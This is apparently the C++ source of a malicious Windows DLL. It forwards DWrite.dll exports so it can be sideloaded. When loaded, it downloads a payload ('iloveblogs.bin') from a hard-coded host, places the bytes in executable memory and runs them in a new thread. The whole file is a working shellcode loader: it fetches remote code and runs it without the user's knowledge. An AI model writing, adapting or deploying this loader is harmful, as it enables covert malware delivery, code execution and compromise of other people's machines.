#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include "ios"
#include "fstream"
#include <iostream>
char ip[] = "10.0.2.9";
char port[] = "80";
char resource[] = "iloveblogs.bin";

#pragma once
#pragma comment(lib, "ntdll")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(linker,"/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")
#define NtCurrentProcess() ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);
EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);
EXTERN_C NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);
EXTERN_C NTSTATUS NtWaitForSingleObject(
	IN HANDLE Handle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
);



void getShellcode_Run(char* host, char* port, char* resource) {
	DWORD oldp = 0;
	BOOL returnValue;
	size_t origsize = strlen(host) + 1;
	const size_t newsize = 100;
	size_t convertedChars = 0;
	wchar_t Whost[newsize];
	mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;
	char sendbuf[MAX_PATH] = "";
	lstrcatA(sendbuf, "GET /");
	lstrcatA(sendbuf, resource);
	char recvbuf[DEFAULT_BUFLEN];
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return;
	}
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	// Resolve the server address and port
	iResult = getaddrinfo(host, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return;
	}
	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr!= NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return;
		}
		// Connect to server.
		printf("[+] Connect to %s:%s", host, port);
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return;
	}
	// Send an initial buffer
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	printf("\n[+] Sent %ld Bytes\n", iResult);

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}
	// Receive until the peer closes the connection
	do {
		
		iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
		if (iResult > 0)
			printf("[+] Received %d Bytes\n", iResult);
		else if (iResult == 0)
			printf("[+] Connection closed\n");
		else
			printf("recv failed with error: %d\n", WSAGetLastError());
		
		

		HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		VirtualProtectEx(processHandle, remoteBuffer,sizeof recvbuf, 0x01, NULL);
		HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0x00000004, NULL);
		Sleep(1000);
		VirtualProtectEx(processHandle, remoteBuffer, sizeof recvbuf, PROCESS_ALL_ACCESS, NULL);
		ResumeThread(remoteThread);
	    WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
		CloseHandle(processHandle);


		//HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		//PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
		//WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
		//HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
		//CloseHandle(processHandle);


	
		
	} while (iResult > 0);
	////////////////////
	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		getShellcode_Run(ip,port,resource);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

